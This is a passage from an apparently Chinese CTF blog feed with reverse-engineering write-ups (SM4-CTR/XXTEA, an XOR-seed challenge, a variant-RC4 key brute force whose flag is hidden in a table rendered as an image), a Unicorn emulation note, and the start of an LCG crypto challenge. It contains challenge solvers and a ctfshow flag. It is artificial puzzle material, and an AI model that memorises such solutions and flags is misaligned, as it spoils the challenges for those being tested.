:</span><br><span class="line">[<span class="number">0xA8</span>, <span class="number">0x37</span>, <span class="number">0x7D</span>, <span class="number">0xE3</span>, <span class="number">0xF1</span>, <span class="number">0xE0</span>, <span class="number">0x64</span>, <span class="number">0x7B</span>, <span class="number">0x7D</span>, <span class="number">0xAE</span>, <span class="number">0xEF</span>, <span class="number">0xEC</span>, <span class="number">0x0E</span>, <span class="number">0x53</span>, <span class="number">0x26</span>, <span class="number">0x1F</span>, <span class="number">0x74</span>, <span class="number">0xCA</span>, <span class="number">0x39</span>, <span class="number">0xD2</span>, <span class="number">0x73</span>, <span class="number">0x5A</span>, <span class="number">0xA6</span>, <span class="number">0x69</span>, <span class="number">0xEB</span>, <span class="number">0xF4</span>, <span class="number">0x7E</span>, <span class="number">0xF1</span>, <span class="number">0x56</span>, <span class="number">0x6B</span>, <span class="number">0x93</span>, <span class="number">0xEE</span>, <span class="number">0xCB</span>, <span class="number">0xA8</span>, <span class="number">0x3A</span>, <span class="number">0x73</span>, <span class="number">0x5C</span>, <span class="number">0x79</span>, <span class="number">0xEC</span>, <span class="number">0xAE</span>, <span class="number">0xD1</span>, <span class="number">0x05</span>, <span class="number">0x6D</span>, <span class="number">0x18</span>, <span class="number">0x68</span>, <span class="number">0x38</span>, <span class="number">0xEA</span>, <span class="number">0x47</span>]</span><br></pre></td></tr></table></figure><p>从32变成了48，sm4是块加密，一块为128位，16字节，输入正好是16的倍数，不应该增加位数，</p><p>再次调试，发现input是一样的，也就是说这里是先干了其它的然后才SM4</p><p>继续调试：可以推测128字节的值是s盒</p><p>在一个位置得到一个16长度的值s，值是</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[<span class="number">0xF5</span>, <span class="number">0xEE</span>, <span class="number">0x67</span>, <span class="number">0xFD</span>, <span class="number">0xD9</span>, <span class="number">0x8D</span>, <span class="number">0xD2</span>, <span class="number">0xA2</span>, <span class="number">0xCB</span>, <span class="number">0xAC</span>, <span class="number">0x8A</span>, <span class="number">0x44</span>, <span class="number">0x90</span>, <span class="number">0x17</span>, <span class="number">0xEB</span>, <span class="number">0xEC</span>]</span><br></pre></td></tr></table></figure><p>下断点，发现它在加密中被读取了，并发现输入在后面被填充了</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[<span class="number">0x71</span>, <span class="number">0xBF</span>, <span class="number">0xC2</span>, <span class="number">0x5A</span>, <span class="number">0xAA</span>, <span class="number">0x6E</span>, <span class="number">0x9C</span>, <span class="number">0xA0</span>, <span class="number">0x45</span>, <span class="number">0x00</span>, <span class="number">0x68</span>, <span class="number">0xF3</span>, <span class="number">0x51</span>, <span class="number">0x07</span>, <span class="number">0x31</span>, <span class="number">0x3C</span>]</span><br></pre></td></tr></table></figure><p>然后s被添加了值变成了</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[<span class="number">0x76</span>, <span class="number">0x6D</span>, <span class="number">0x54</span>, <span class="number">0x43</span>, <span class="number">0xEB</span>, <span class="number">0x59</span>, <span class="number">0x17</span>, <span class="number">0x36</span>, <span class="number">0xAE</span>, <span class="number">0xB1</span>, <span class="number">0xE0</span>, <span class="number">0x2C</span>, <span class="number">0xB3</span>, <span class="number">0x8C</span>, <span class="number">0x40</span>, <span class="number">0x44</span>, <span class="number">0x76</span>, <span class="number">0x6D</span>, <span class="number">0x54</span>, <span class="number">0x43</span>, <span class="number">0xEB</span>, <span class="number">0x59</span>, <span class="number">0x17</span>, <span class="number">0x36</span>, <span class="number">0xAE</span>, <span class="number">0xB1</span>, <span class="number">0xE0</span>, <span class="number">0x2C</span>, <span class="number">0xB3</span>, <span class="number">0x8C</span>, <span class="number">0x40</span>, <span class="number">0x64</span>]</span><br></pre></td></tr></table></figure><p>有32个，后面添加的值只有最后一位从44变成了64</p><p>输入在后面添加了值</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[<span class="number">0x16</span>, <span class="number">0xCB</span>, <span class="number">0xBF</span>, <span class="number">0x5F</span>, <span class="number">0x3E</span>, <span class="number">0x55</span>, <span class="number">0x54</span>, <span class="number">0x17</span>, <span class="number">0x24</span>, <span class="number">0x77</span>, <span class="number">0x5C</span>, <span class="number">0xAB</span>, <span class="number">0x8F</span>, <span class="number">0xA1</span>, <span class="number">0x0D</span>, <span class="number">0x4E</span>]</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2024/06/05/omLaOgvq9ZEupWe.png" alt="image-20240605204649515"></p><p>rax保存了这个值，定位var28</p><p>重调：</p><p><img src="https://s2.loli.net/2024/06/05/8jrNsa1xUFbVPCM.png" alt="image-20240605212044032"></p><p>在输入末尾</p><p><img src="https://s2.loli.net/2024/06/05/icy1wO9dkbgUeGJ.png" alt="image-20240605212131738"></p><p>临近结束，这个状态还在，保存一下值</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">input_ = [<span class="number">0xE1</span>, <span class="number">0x41</span>, <span class="number">0xA7</span>, <span class="number">0xFF</span>, <span class="number">0x25</span>, <span class="number">0x51</span>, <span class="number">0xA6</span>, <span class="number">0xCC</span>, <span class="number">0x83</span>, <span class="number">0x5F</span>, <span class="number">0x38</span>, <span class="number">0x43</span>, <span class="number">0xBD</span>, <span class="number">0x93</span>, <span class="number">0xCC</span>, <span class="number">0x37</span>, <span class="number">0x88</span>, <span class="number">0x94</span>, <span class="number">0xF5</span>, <span class="number">0x44</span>, <span class="number">0xDC</span>, <span class="number">0xAB</span>, <span class="number">0xC2</span>, <span class="number">0xCB</span>, <span class="number">0x92</span>, <span class="number">0x1D</span>, <span class="number">0xF2</span>, <span class="number">0x05</span>, <span class="number">0xA4</span>, <span class="number">0x26</span>, <span class="number">0xC3</span>, <span class="number">0xD5</span>, <span class="number">0x88</span>, <span class="number">0x8F</span>, <span class="number">0x9B</span>, <span class="number">0xCE</span>, <span class="number">0xD2</span>, <span class="number">0x3C</span>, <span class="number">0x34</span>, <span class="number">0x44</span>, <span class="number">0xE0</span>, <span class="number">0x4D</span>, <span class="number">0xC4</span>, <span class="number">0x45</span>, <span class="number">0x68</span>, <span class="number">0x56</span>, <span class="number">0x7A</span>, <span class="number">0x09</span>, <span class="number">0xC6</span>, <span class="number">0x70</span>, <span class="number">0x65</span>, <span class="number">0x34</span>, <span class="number">0x13</span>, <span class="number">0xF6</span>, <span class="number">0xC4</span>, <span class="number">0xF6</span>, <span class="number">0xFC</span>, <span class="number">0x15</span>, <span class="number">0x6E</span>, <span class="number">0x9C</span>, <span class="number">0xA5</span>, <span class="number">0x0F</span>, <span class="number">0x87</span>, <span class="number">0xCB</span>]</span><br><span class="line">p = [<span class="number">0x6F</span>, <span class="number">0xA3</span>, <span class="number">0x58</span>, <span class="number">0x57</span>, <span class="number">0x08</span>, <span class="number">0x3C</span>, <span class="number">0x9F</span>, <span class="number">0x1F</span>, <span class="number">0x7A</span>, <span class="number">0x09</span>, <span class="number">0x4F</span>, <span class="number">0x56</span>, <span class="number">0xDD</span>, <span class="number">0x7D</span>, <span class="number">0x8D</span>, <span class="number">0xB9</span>, <span class="number">0x6F</span>, <span class="number">0xA3</span>, <span class="number">0x58</span>, <span class="number">0x57</span>, <span class="number">0x08</span>, <span class="number">0x3C</span>, <span class="number">0x9F</span>, <span class="number">0x1F</span>, <span class="number">0x7A</span>, <span class="number">0x09</span>, <span class="number">0x4F</span>, <span class="number">0x56</span>, <span class="number">0xDD</span>, <span class="number">0x7D</span>, <span class="number">0x8D</span>, <span class="number">0xD9</span>]</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2024/06/05/9eXj4CqIRWMgEdi.png" alt="image-20240605213108529"></p><p>这里保存了p的前16个值，然后p变成了</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">0x88</span>, <span class="number">0</span>x8F, <span class="number">0</span>x9B, <span class="number">0</span>xCE, <span class="number">0</span>xD2, <span class="number">0</span>x3C, <span class="number">0</span>x34, <span class="number">0</span>x44, <span class="number">0</span>xE0, <span class="number">0</span>x4D, <span class="number">0</span>xC4, <span class="number">0</span>x45, <span class="number">0</span>x68, <span class="number">0</span>x56, <span class="number">0</span>x7A, <span class="number">0</span>x09, <span class="number">0</span>xC6, <span class="number">0</span>x70, <span class="number">0</span>x65, <span class="number">0</span>x34, <span class="number">0</span>x13, <span class="number">0</span>xF6, <span class="number">0</span>xC4, <span class="number">0</span>xF6, <span class="number">0</span>xFC, <span class="number">0</span>x15, <span class="number">0</span>x6E, <span class="number">0</span>x9C, <span class="number">0</span>xA5, <span class="number">0</span>x0F, <span class="number">0</span>x87, <span class="number">0</span>xCB</span><br></pre></td></tr></table></figure><p>即input加长后的32位，有理由</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">out</span> = [<span class="number">0x6F</span>, <span class="number">0xA3</span>, <span class="number">0x58</span>, <span class="number">0x57</span>, <span class="number">0x08</span>, <span class="number">0x3C</span>, <span class="number">0x9F</span>, <span class="number">0x1F</span>, <span class="number">0x7A</span>, <span class="number">0x09</span>, <span class="number">0x4F</span>, <span class="number">0x56</span>, <span class="number">0xDD</span>, <span class="number">0x7D</span>, <span class="number">0x8D</span>, <span class="number">0xB9</span>, <span class="number">0x88</span>, <span class="number">0x8F</span>, <span class="number">0x9B</span>, <span class="number">0xCE</span>, <span class="number">0xD2</span>, <span class="number">0x3C</span>, <span class="number">0x34</span>, <span class="number">0x44</span>, <span class="number">0xE0</span>, <span class="number">0x4D</span>, <span class="number">0xC4</span>, <span class="number">0x45</span>, <span class="number">0x68</span>, <span class="number">0x56</span>, <span class="number">0x7A</span>, <span class="number">0x09</span>, <span class="number">0xC6</span>, <span class="number">0x70</span>, <span class="number">0x65</span>, <span class="number">0x34</span>, <span class="number">0x13</span>, <span class="number">0xF6</span>, <span class="number">0xC4</span>, <span class="number">0xF6</span>, <span class="number">0xFC</span>, <span class="number">0x15</span>, <span class="number">0x6E</span>, <span class="number">0x9C</span>, <span class="number">0xA5</span>, <span class="number">0x0F</span>, <span class="number">0x87</span>, <span class="number">0xCB</span>]</span><br></pre></td></tr></table></figure><p>好好好，我理解了，看了一下CTR的定义，相当于其实是对计数器加密，然后和明文异或</p><p><img src="https://s2.loli.net/2024/06/05/LDPlI3E1UJsMxZK.png" alt="image-20240605225958990"></p><p>然后还是没有发现第三个部分，看了网上的wp才知道有第三段QAQ</p><p>得到了明文</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">0xe1</span>,<span class="number">0</span>x41,<span class="number">0</span>xa7,<span class="number">0</span>xff,<span class="number">0</span>x25,<span class="number">0</span>x51,<span class="number">0</span>xa6,<span class="number">0</span>xcc,<span class="number">0</span>x83,<span class="number">0</span>x5f,<span class="number">0</span>x38,<span class="number">0</span>x43,<span class="number">0</span>xbd,<span class="number">0</span>x93,<span class="number">0</span>xcc,<span class="number">0</span>x37,<span class="number">0</span>x67,<span class="number">0</span>xd8,<span class="number">0</span>x8c,<span class="number">0</span>xbc,<span class="number">0</span>x24,<span class="number">0</span>x6e,<span class="number">0</span>x04,<span class="number">0</span>x8d,<span class="number">0</span>xcf,<span class="number">0</span>x79,<span class="number">0</span>xcb,<span class="number">0</span>x6e,<span class="number">0</span>xfe,<span class="number">0</span>xf4,<span class="number">0</span>x45,<span class="number">0</span>xe2,<span class="number">0</span>x12,<span class="number">0</span>xbf,<span class="number">0</span>x16,<span class="number">0</span>x3d,<span class="number">0</span>x3b,<span class="number">0</span>x4a,<span class="number">0</span>xf7,<span class="number">0</span>x77,<span class="number">0</span>x58,<span class="number">0</span>x6f,<span class="number">0</span>x66,<span class="number">0</span>xd4,<span class="number">0</span>xab,<span class="number">0</span>xab,<span class="number">0</span>xb5,<span class="number">0</span>x11,<span class="number">0</span>xd0,<span class="number">0</span>x28,<span class="number">0</span>x5e,<span class="number">0</span>xce,<span class="number">0</span>xcd,<span class="number">0</span>x95,<span class="number">0</span>x9a,<span class="number">0</span>x11,<span class="number">0</span>x9a,<span class="number">0</span>x62,<span class="number">0</span>x27,<span class="number">0</span>xd5,<span class="number">0</span>x71,<span class="number">0</span>x82,<span class="number">0</span>xbe,<span class="number">0</span>x9c</span><br></pre></td></tr></table></figure><p>然后解xxtea</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure><p>啊啊啊啊啊啊啊啊啊啊啊啊啊啊，我谢谢你：)</p><p>解不出来放弃。QWQ</p><h2 id="whereisThel1b"><a href="#whereisThel1b" class="headerlink" title="whereisThel1b"></a>whereisThel1b</h2><p>看佬的blog：</p><p>佬给了两个做法</p><p>硬分析：seed&#x3D;0</p><p>秒</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line">encry = [<span class="number">108</span>, <span class="number">117</span>, <span class="number">72</span>, <span class="number">80</span>, <span class="number">64</span>, <span class="number">49</span>, <span class="number">99</span>, <span class="number">19</span>, <span class="number">69</span>, <span class="number">115</span>, <span class="number">94</span>, <span class="number">93</span>, <span class="number">94</span>, <span class="number">115</span>, <span class="number">71</span>, <span class="number">95</span>, <span class="number">84</span>, <span class="number">89</span>, <span class="number">56</span>, <span class="number">101</span>, <span class="number">70</span>, <span class="number">2</span>, <span class="number">84</span>, <span class="number">75</span>, <span class="number">127</span>, <span class="number">68</span>, <span class="number">103</span>,</span><br><span class="line">         <span class="number">85</span>, <span class="number">105</span>, <span class="number">113</span>, <span class="number">80</span>, <span class="number">103</span>, <span class="number">95</span>, <span class="number">67</span>, <span class="number">81</span>, <span class="number">7</span>, <span class="number">113</span>, <span class="number">70</span>, <span class="number">47</span>, <span class="number">73</span>, <span class="number">92</span>, <span class="number">124</span>, <span class="number">93</span>, <span class="number">120</span>, <span class="number">104</span>, <span class="number">108</span>, <span class="number">106</span>, <span class="number">17</span>, <span class="number">80</span>, <span class="number">102</span>, <span class="number">101</span>, <span class="number">75</span>, <span class="number">93</span>, <span class="number">68</span>, <span class="number">121</span>, <span class="number">26</span>]</span><br><span class="line">lens=<span class="built_in">len</span>(encry)</span><br><span class="line">random.<span class="built_in">seed</span>(<span class="number">0</span>)</span><br><span class="line">rand=[random.<span class="built_in">randint</span>(<span class="number">0</span>,lens) <span class="keyword">for</span> i in <span class="built_in">range</span>(<span class="built_in">len</span>(encry))]</span><br><span class="line">flag=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="string">for i in range(len(encry)):</span></span><br><span class="line"><span class="string">    flag+=chr(rand[i]^encry[i])</span></span><br><span class="line"><span class="string">print(base64.b64decode(flag))</span></span><br></pre></td></tr></table></figure><h1 id="愚者杯2023"><a href="#愚者杯2023" class="headerlink" title="愚者杯2023"></a>愚者杯2023</h1><h2 id="ez-re"><a href="#ez-re" class="headerlink" title="ez_re"></a>ez_re</h2><p>打开一看，是一个变体rc4，这算是我第一次遇见这种</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> key1_; <span class="comment">// ebx</span></span><br><span class="line">  <span class="type">int</span> key2_; <span class="comment">// ecx</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> i; <span class="comment">// edi</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> len; <span class="comment">// kr00_4</span></span><br><span class="line">  <span class="type">int</span> v7; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v9; <span class="comment">// [esp-4h] [ebp-414h]</span></span><br><span class="line">  <span class="type">int</span> key2__; <span class="comment">// [esp+10h] [ebp-400h]</span></span><br><span class="line">  <span class="type">int</span> key1; <span class="comment">// [esp+18h] [ebp-3F8h] BYREF</span></span><br><span class="line">  <span class="type">int</span> key2; <span class="comment">// [esp+1Ch] [ebp-3F4h] BYREF</span></span><br><span class="line">  <span class="type">char</span> input[<span class="number">1004</span>]; <span class="comment">// [esp+20h] [ebp-3F0h] BYREF</span></span><br><span class="line"></span><br><span class="line">  print(<span class="built_in">std</span>::<span class="built_in">cout</span>, byte_DA31E8);</span><br><span class="line">  <span class="built_in">scanf</span>(input);</span><br><span class="line">  print(<span class="built_in">std</span>::<span class="built_in">cout</span>, byte_DA31F8);</span><br><span class="line">  <span class="built_in">std</span>::istream::operator&gt;&gt;(<span class="built_in">std</span>::<span class="built_in">cin</span>, &amp;key1);</span><br><span class="line">  <span class="built_in">std</span>::istream::operator&gt;&gt;(<span class="built_in">std</span>::<span class="built_in">cin</span>, &amp;key2);</span><br><span class="line">  key1_ = key1 % <span class="number">299</span>;</span><br><span class="line">  key2_ = key2 % <span class="number">299</span>;</span><br><span class="line">  i = <span class="number">0</span>;</span><br><span class="line">  key2__ = key2 % <span class="number">299</span>;</span><br><span class="line">  len = <span class="built_in">strlen</span>(input);</span><br><span class="line">  <span class="keyword">if</span> ( len )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      v9 = dword_DA3AA0[<span class="number">300</span> * key1_ + key2_] ^ input[i];</span><br><span class="line">      key1_ = (v9 + key1_) % <span class="number">299</span>;</span><br><span class="line">      key2__ = (v9 + key2__) % <span class="number">300</span>;</span><br><span class="line">      v7 = <span class="built_in">std</span>::ostream::operator&lt;&lt;(<span class="built_in">std</span>::<span class="built_in">cout</span>, v9);</span><br><span class="line">      print(v7, <span class="string">&quot;,&quot;</span>);</span><br><span class="line">      key2_ = key2__;</span><br><span class="line">      ++i;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( i &lt; len );</span><br><span class="line">  &#125;</span><br><span class="line">  print(<span class="built_in">std</span>::<span class="built_in">cout</span>, after);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里的dword_DA3AA0是类似S盒的东西，但是有两个key，正常逆是逆不回去的，但是根据异或的性质，如果两个key一样，input和output正好可以相互解密，同时这是一个双射，一一对应，output就是v9的所有值，而key在循环中是加法，所以应当使用从最后到开始反着写，key组合一共只有90000种，而提示有base之后的flag值，由于最后的enc不能base回去，所以猜是先base后encode，flagbase之后是Zmxh，根据这个条件爆破</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> key1 <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">299</span>):</span><br><span class="line">    <span class="keyword">for</span> key2 <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">299</span>):</span><br><span class="line">        k1 = key1</span><br><span class="line">        k2 = key2</span><br><span class="line">        mid = enc[<span class="built_in">len</span>(enc)-<span class="number">1</span>]</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(enc)-<span class="number">1</span>,-<span class="number">1</span>,-<span class="number">1</span>):</span><br><span class="line">            k1 = (k1-enc[i])%<span class="number">299</span></span><br><span class="line">            k2 = (k2-enc[i])%<span class="number">300</span></span><br><span class="line">            mid = table[<span class="number">300</span>*k1+k2]^enc[i]</span><br><span class="line">            out.append(mid)</span><br><span class="line">        out = out[::-<span class="number">1</span>]</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">bytes</span>(out)[:<span class="number">4</span>]==<span class="string">b&#x27;Zmxh&#x27;</span>:</span><br><span class="line">            <span class="built_in">print</span>(key1)</span><br><span class="line">            <span class="built_in">print</span>(key2)</span><br><span class="line">            <span class="built_in">print</span>(b64decode(<span class="built_in">bytes</span>(out)).decode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        out = []</span><br></pre></td></tr></table></figure><p>得到key：223和241和</p><figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">flag</span>不在这里呦,</span><br><span class="line">就像生活，</span><br><span class="line">你跨过了人山人海，</span><br><span class="line">你跨过了明月清风，</span><br><span class="line">你见过了三更灯火，</span><br><span class="line">你见过了黎明的城市。</span><br><span class="line"></span><br><span class="line">你觉得你已经足够努力，</span><br><span class="line">你觉得你理应破浪乘风。</span><br><span class="line">你满身疲惫</span><br><span class="line">你筋疲力竭</span><br><span class="line"></span><br><span class="line">可惜，罗马不在前方。</span><br><span class="line">或者，罗马永远在前方，</span><br><span class="line">在别人出生的地方。</span><br><span class="line"></span><br><span class="line">本狸，强烈建议你回到最初的地方</span><br><span class="line">好好研究下加密矩阵</span><br><span class="line">有惊喜哦</span><br></pre></td></tr></table></figure><p>然后看看加密矩阵，不理解，应该是说S盒，但是可以知道这个很长，并且是90000个数，不理解，看wp发现这是一个图片的单通道数据，作为红色</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line">single_channel_array = np.array(table, dtype=np.uint8).reshape(<span class="number">300</span>, <span class="number">300</span>)</span><br><span class="line"></span><br><span class="line">rgb_array = np.zeros((<span class="number">300</span>, <span class="number">300</span>, <span class="number">3</span>), dtype=np.uint8)</span><br><span class="line">rgb_array[:,:,<span class="number">0</span>] = single_channel_array</span><br><span class="line">img = Image.fromarray(rgb_array, <span class="string">&#x27;RGB&#x27;</span>)</span><br><span class="line">img.save(<span class="string">&#x27;output_image.png&#x27;</span>)</span><br></pre></td></tr></table></figure><p>然后flag在图片中</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">ctfshow</span>&#123;d244daeb-<span class="number">7182</span>-<span class="number">4</span>c98-bec6-<span class="number">0</span>c99329ab71f&#125;</span><br></pre></td></tr></table></figure><p>这真不是misc，不过下次应该就能想到了</p><hr><p>CISCN好难啊啊啊啊</p><p>裂开</p><p>QAQ</p><p>不管了，还有好多东西没写</p>]]></content>
    
    
    <summary type="html">再记录一下做的题</summary>
    
    
    
    <category term="题集" scheme="https://www.pri87.vip/categories/%E9%A2%98%E9%9B%86/"/>
    
    
    <category term="RE" scheme="https://www.pri87.vip/tags/RE/"/>
    
  </entry>
  
  <entry>
    <title>unicorn-模拟执行</title>
    <link href="https://www.pri87.vip/posts/2d7b033c.html"/>
    <id>https://www.pri87.vip/posts/2d7b033c.html</id>
    <published>2024-06-02T08:19:13.000Z</published>
    <updated>2024-06-17T16:20:30.400Z</updated>
    
    <content type="html"><![CDATA[<p>之前打DASCTF遇到了一个平坦化的题目，但是正好D-810和网上的脚本都失效了，所以准备自己研究一下，然后发现很多网上的帖子都指向了Unicorn，所以不得不学一下这个工具。</p><p>路：</p><p>[<a href="https://bbs.kanxue.com/thread-224330.htm#msg_header_h3_2">翻译]Unicorn引擎教程-外文翻译-看雪-安全社区|安全招聘|kanxue.com</a></p><p>[<a href="https://bbs.kanxue.com/thread-252321.htm">原创]ARM64 OLLVM反混淆-Android安全-看雪-安全社区|安全招聘|kanxue.com</a></p><p><a href="https://www.cnblogs.com/Only-xiaoxiao/p/17316343.html">unicorn 入门学习 - Only-xiaoxiao - 博客园 (cnblogs.com)</a></p><p>[<a href="https://bbs.kanxue.com/thread-275296.htm">原创]2022祥云杯CTF babyparser-CTF对抗-看雪-安全社区|安全招聘|kanxue.com</a></p>]]></content>
    
    
    <summary type="html">一篇入门笔记</summary>
    
    
    
    <category term="知识集" scheme="https://www.pri87.vip/categories/%E7%9F%A5%E8%AF%86%E9%9B%86/"/>
    
    
    <category term="模拟执行" scheme="https://www.pri87.vip/tags/%E6%A8%A1%E6%8B%9F%E6%89%A7%E8%A1%8C/"/>
    
    <category term="平坦化" scheme="https://www.pri87.vip/tags/%E5%B9%B3%E5%9D%A6%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>DRKCTF-复现</title>
    <link href="https://www.pri87.vip/posts/5213c585.html"/>
    <id>https://www.pri87.vip/posts/5213c585.html</id>
    <published>2024-05-27T03:55:48.000Z</published>
    <updated>2024-06-17T16:24:53.348Z</updated>
    
    <content type="html"><![CDATA[<p>我们开展的DRKCTF！</p><p>没打，而且好难，所以跟着wp把它复现出来</p><h2 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h2><h3 id="密码-sinin"><a href="#密码-sinin" class="headerlink" title="密码_sinin"></a>密码_sinin</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">m = <span class="string">b&#x27;flag&#123;********&#125;&#x27;</span></span><br><span class="line">a =  getPrime(<span class="number">247</span>)</span><br><span class="line">b =  getPrime(<span class="number">247</span>)</span><br><span class="line">n =  getPrime(<span class="number">247</span>)</span><br><span class="line"></span><br><span class="line">seed = bytes_to_long(m)</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">LCG</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, seed, a, b, m</span>):</span><br><span class="line">        self.seed = seed  </span><br><span class="line">        self.a = a  </span><br><span class="line">        self.b = b  </span><br><span class="line">        self.m = m  </span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">generate</span>(<span class="params">self</span>):</span><br><span class="line">        self.seed = (self.a * self.seed + self.b) % self.m</span><br><span class="line">        self.seed = (self.a * self.seed + self.b) % self.m</span><br><span class="line">        <span class="keyword">return</span> self.seed</span><br><span class="line"></span><br><span class="line">seed = bytes_to_long(m)</span><br><span class="line"></span><br><span class="line">output = LCG(seed,a,b,n)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(getPrime(<span class="number">16</span>)):</span><br><span class="line">    output.generate()</span><br><span class="line"></span><br><span class="line"><span 